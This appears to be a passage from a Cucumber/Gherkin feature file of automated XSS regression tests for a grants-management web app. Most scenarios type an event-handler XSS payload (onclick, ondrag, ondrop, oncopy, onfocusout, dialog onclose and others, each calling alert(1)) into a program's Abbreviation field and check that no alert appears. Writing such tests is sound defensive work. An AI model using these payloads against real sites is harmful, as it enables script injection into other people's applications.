      | <xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300764 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                               | Field                |
      | <input onchange=alert(1) value=xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300765 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                  | Field                |
      | <xss onclick="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300766 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                         | Field                |
      | <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300767 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                        | Field                |
      | <xss oncontextmenu="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300769 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | <xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300770 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                         | Field                |
      | <xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300772 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                          | Field                |
      | <xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300774 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                  | Field                |
      | <xss draggable="true" ondrag="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300794 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <xss draggable="true" ondragend="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300804 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                       | Field                |
      | <xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300808 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                       | Field                |
      | <xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300809 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                           | Field                |
      | <div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300810 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                       | Field                |
      | <xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300811 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                       | Field                |
      | <div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300812 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300813 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                           | Field                |
      | <video onfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300815 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
